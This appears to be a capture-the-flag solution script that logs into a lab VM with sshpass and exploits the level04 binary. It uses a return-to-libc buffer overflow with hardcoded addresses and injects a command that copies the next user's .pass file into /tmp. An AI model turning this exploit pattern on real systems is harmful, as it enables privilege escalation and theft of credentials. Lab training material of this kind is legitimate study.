#!/bin/bash

VM_ID='192.168.56.6'
if [ ! -z "$1" ]; then
    VM_ID="$1"
fi
ACTUAL_LEVEL=$(echo "$0" | grep --only --color=never --max-count=1 "level0[0-9].sh" | head --lines=1 | sed 's/.*level0\([0-9]\).sh.*/\1/g')

if [ -z "${ACTUAL_LEVEL}" ]; then
    echo "cannot get the level number of the actua level"
    exit 1
fi

if [ "$(basename $(pwd))" = "Ressources" ]; then
    cd ..
fi

if [ "$(basename $(pwd))" != "level0${ACTUAL_LEVEL}" ]; then
    echo "not in corresponding directory must be: level0${ACTUAL_LEVEL}"
    exit 1
fi

PREVIOUS_LEVEL="$(( "${ACTUAL_LEVEL}" - 1))"

if [ ! -f "../level0${PREVIOUS_LEVEL}/flag" ]; then
    echo "../level0${PREVIOUS_LEVEL}/flag does not exist"
    exit 1
fi

act_level_password=$(cat "../level0${PREVIOUS_LEVEL}/flag")

sshpass -p "${act_level_password}" ssh level0${ACTUAL_LEVEL}@${VM_ID} -p 4242 'python -c "print \"A\"*156 + \"\xd0\xae\xe6\xf7\" + \"\x70\xeb\xe5\xf7\" + \"\xec\x97\xf8\xf7\"" > /tmp/level04_overflow; echo "cat /home/users/level05/.pass > /tmp/level04_flag" > /tmp/level04_command' 2> /dev/null

flag=""
cnt=0
while [ -z "${flag}" ] && [ "${cnt}" -lt 5 ]
do
    echo "Ctrl-D svp:"
    sshpass -p "${act_level_password}" ssh level0${ACTUAL_LEVEL}@${VM_ID} -p 4242 'cat /tmp/level04_overflow - /tmp/level04_command | timeout 4 ./level04' 2> /dev/null

    flag=$(sshpass -p "${act_level_password}" ssh level0${ACTUAL_LEVEL}@${VM_ID} -p 4242 'cat /tmp/level04_flag' 2> /dev/null | grep --max-count=1 '^[a-zA-Z0-9]\{40\}$' | head --line=1)

    let cnt++
done

echo -e "FLAG:\n${flag}"
